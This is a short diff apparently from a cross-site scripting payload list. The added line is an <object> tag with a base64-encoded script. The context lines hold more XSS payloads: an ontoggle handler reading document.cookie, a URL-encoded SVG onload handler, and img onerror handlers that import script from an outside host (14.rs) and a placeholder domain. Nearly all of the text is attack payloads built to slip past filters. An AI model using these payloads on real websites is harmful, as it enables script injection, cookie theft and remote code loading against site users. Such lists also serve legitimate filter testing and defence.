@@ -1,4 +1,5 @@
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+<object data=`data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=`></object>
 %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
 "><img/src/onerror=import('//14.rs/')>"@14.rs
 "><img/src/onerror=import('//domain/')>"@yourdomain
